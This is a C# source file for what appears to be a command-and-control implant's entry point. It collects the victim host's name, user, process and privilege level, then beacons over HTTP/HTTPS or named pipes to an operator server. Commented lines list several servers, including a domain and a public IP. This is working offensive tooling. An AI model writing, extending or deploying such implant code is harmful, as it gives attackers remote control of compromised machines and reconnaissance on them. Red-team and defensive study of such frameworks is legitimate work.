using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {

        private static AgentMetadata s_metadata;
        private static CommModule s_commModule;

        private static CancellationTokenSource s_tokenSource = new CancellationTokenSource();

        static void Main(string[] args)
        {
            //string server = "192.168.56.103";
            //int port = 400;
            //string protocol = "http";

            //string server = "192.168.56.103";
            //int port = 443;
            //string protocol = "https";


            //server = "gate.fropops.fr";
            //port = 443;
            //protocol = "https";

            //server = "13.38.61.75";
            //port = 80;
            //server = "127.0.0.1";
            //port = 8080;
            //server = "192.168.56.102";
            //port = 443;
            //protocol = "http";

            //string connectionInfo = "http:192.168.56.102:443";
            //string connectionInfo = "smb:msagent_0101";

            //if (args.Length == 1)
            //{
            //    var split = args[0].Split(':');
            //    protocol = split[0];
            //    server = split[1];
            //    port = Convert.ToInt32(split[2]);
            //}

#if DEBUG
            if(args.Count() == 0)
                args = new string[] { "http:192.168.56.1:400"/*, "pipe:id"*/ };
                //args = new string[] { "pipe:67120805-ed05-45fe-ae79-e709a948d3e2" };
#endif


            GenerateMetadata();

            var agent = new Models.Agent(s_metadata);

            Thread agentThread = new Thread(agent.Start);
            agentThread.Start();

            foreach (var arg in args)
            {
                var tab = arg.Split(':');
                //Http communicator
                if ((tab.Length == 2 || tab.Length == 3) && (tab[0] == "http" || tab[0] == "https"))
                {
                    string protocol = tab[0];
                    string server = tab[1];
                    int port = tab.Length > 2 ? Convert.ToInt32(tab[2]) : tab[0] == "http" ? 80 : 443;

                    agent.HttpCommunicator.Init(protocol, server, port);
                    agent.HttpCommunicator.Start();
                }

                //Pipe Communicator
                if (tab.Length == 2 && tab[0] == "pipe")
                {
                    s_metadata.Id = tab[1];
                    agent.PipeCommunicator.Init(s_metadata.Id);
                }
                else
                {
                    agent.PipeCommunicator.Init();
                }
            }

            agent.PipeCommunicator.Start();


            agentThread.Join();

            //Thread commThread = new Thread(s_commModule.Start);
            //commThread.Start();
            //commThread.Join();
        }





        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();
            var userName = Environment.UserName;

            string integrity = "Medium";
            if (userName == "SYSTEM")
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent())
            {
                if (identity.User != identity.Owner)
                {
                    integrity = "High";
                }
            }

            s_metadata = new AgentMetadata()
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                UserName = userName,
                ProcessId = process.Id,
                ProcessName = process.ProcessName,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
                Integrity = integrity,
            };

        }
    }
}
